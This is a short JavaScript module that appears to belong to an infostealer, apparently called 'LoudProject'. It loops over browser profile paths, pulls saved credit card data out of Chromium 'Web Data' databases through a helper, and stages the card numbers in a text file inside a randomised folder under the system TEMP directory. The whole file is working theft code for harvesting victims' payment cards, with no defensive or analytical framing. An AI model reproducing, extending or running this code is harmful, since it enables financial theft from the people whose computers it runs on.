const fs = require("fs");
const getCreditcards = require("../../../functions/browsers/GetCards");
const { paths } = require("../../../data/paths");
const { rdm } = require("../../../data/Config");
const path = require("path");

/**
 * Saves the retrieved credit card information into a text file.
 * 
 * @returns {Promise<void>} A promise that resolves once the credit card data is saved into a file.
 * 
 * This function loops through the specified paths, retrieves the credit card information from browser profiles, 
 * and saves it into a file located in the temporary directory.
 * It ensures that the directory exists before writing the file.
 */

async function Save() {
  let creditcards = "";

  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Web Data")) creditcards += (await getCreditcards(paths[i])) || "";
  }
  const dirPath = path.join(process.env.TEMP, `LoudProject\\${rdm}\\Chromium`);

  if (!creditcards.includes("NUMBER:")) return;
  if (!fs.existsSync(dirPath)) {
    fs.mkdirSync(dirPath, { recursive: true });
  }

  const filePath = path.join(dirPath, "CreditsCards.txt");

  fs.writeFileSync(filePath, creditcards);
}

module.exports = { Save };
